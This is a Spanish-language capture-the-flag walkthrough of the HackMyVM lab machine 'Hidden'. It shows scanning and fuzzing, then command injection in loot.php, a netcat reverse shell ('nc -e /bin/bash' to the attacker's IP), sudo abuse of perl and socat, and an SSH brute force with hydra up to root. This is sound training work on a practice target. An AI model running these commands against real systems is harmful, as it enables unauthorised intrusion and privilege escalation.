## MAQUINA HIDDEN

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210455.png)

Hacemos un escaneo de red para saber que maquinas estan conectadas en nuestra red, para ello utilizamos netdiscover:

````bash
netdiscover -i eth0 -r 192.168.0.19
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20151549.png)

Luego creamos una carpeta con la ip para ser un poco mas ordenado, seguidamente hacemos un ping para verificar si tenemos conectividad con la maquina.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20151608.png)

Ahora continuamos con un escaneo de puertos usando nmap:

````bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20151726.png)

````bash
nmap -sV -sC 192.168.0.19
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20151735.png)

Tenemos los puertos 22 y el 80 abiertos:
Entramos al servicio web:

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20151848.png)

Revisamos el codigo fuente de la imagen y tenemos algo importante.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20151857.png)

En la cadena de texto nos dice que hay que desencodear la imagen, asi que buscamos informacion en google y nos da que es una especie de encodeacion llamada rosicruician cipher.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20162328.png)

Buscamos en dCode.com y colocamos los signos.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20162304.png)

Tenemos como respuesta la palabra: "syshiddenhmv".

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20162522.png)

En el codigo fuente vemos que en el "formato" que parece ser una url, asi que colocamos en el /etc/hosts el sys.hidden.hmv.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20163003.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20163326.png)

Colocamos la url en la web y tenemos el siguiente respuesta.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20163247.png)

Con gobuster vamos enumerar los directorios ocultos de la web de sys.hidden.hmv.
Y encontramos 3 directorios

````bash
gobuster -u ip -w wordlists
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20164115.png)

En el directorio users tenemos este archivo llamado secret.txt

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20163427.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20163439.png)

En el directorio oculto members aparece lo siguiente:

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20163701.png)

Bien aca nos centraremos en el directorio weapon, aca el directorio no nos brinda info por lo que realizamos otro escaneo de directorios ocultos pero esta vez con wfuzz:

````bash
wfuzz -c --hc -t 200 -w wordlists http://sys.hidden.hmv/FUZZ -z .php,.txt
````
Y nos encontro 2 directorios, un index.html y uno llamado loot.php

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20165029.png)

Bueno entramos al directorio loot.php y no nos dirije a ningun lado y tampoco tenemos ningun resultado que nos de informacion.

Lo que hay que hacer es realizar otro escaneo de directorios ya con la misma herramienta ya que nos falta otro parametro en la url. 

Aca tenemos un ejemplo de como poder fuzzear la url para buscar otros parametros.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20165054.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20184224.png)

Vamos a realizar el escaneo con wfuzz:

````bash
wfuzz -c --hw 0 -t 200 -w /usr/share/wordlists/seclists/Discover/WEB-Content/discovery-list-2.3-medium.txt http://sys.hidden.hmv/weapon/loot.php?FUZZ=ls
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20194127.png)

Como resultado tenemos el parametro 'hack', colocamos esto en la url y quedaria de la siguiente forma:

'http://sys.hidden.hmv/weapon/loot.php?hack=ls' esto al colocarle el parametro ls, nos va a listar el contenido interno de donde esta alejado la maquina.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20194324.png)

Probamos con whoami y nos lista el usuario www-data.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20194334.png)

Como podemos injectar comando, nos enviamos una revershell dirigida a nuestra maquina con el comando:

````bash
nc -e /bin/bash 192.168.0.162 1234
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20194650.png)

nos ponemos en escucha con netcat y al enviarnos la revershell obtenemos acceso siendo usuario www-data:

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20201136.png)

Vemos los usuarios dentro de la maquina leyendo el /etc/passwd y tenemos 2 usuarios:

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20202143.png)

Entramos en el directorio atenea y leemos con ls -la el contenido del directorio encontrandonos con una carpeta oculta llamad .hidden

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20202243.png)

En esa carpeta tenemos un archivo llamado atenea.txt, que no podemos leer porque no tenemos permisos.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20202304.png)

Buscamos binarios con sudo -l  y podemos acceder a usuarios toreto con el binario perl porque no nos pide pass.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20202424.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20202445.png)

Colocamos el comando encontrado en gtfobins y somos usuario toreto.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20202901.png)

Volvemos a la carpeta .hidden para leer el contenido, y tenemos una lista de palabras que a simple vista parecen posibles passwd

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20203016.png)

Con hydra vamos a probar si encontramos alguna passwd para el usuario atenea.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210044.png)

Y nos encuentra una password, nos logueamos en el ssh y somos el usuario atenea.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210130.png)

Buscamos binarios con sudo -l y tenemos un binario llamado socat

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210205.png)

Volvemos a buscar en gtfobins si es posbile escalar privilegios con el binario socat y vemos que si

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210226.png)
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210313.png)
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210322.png)

somos root!

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-24%20210504.png)
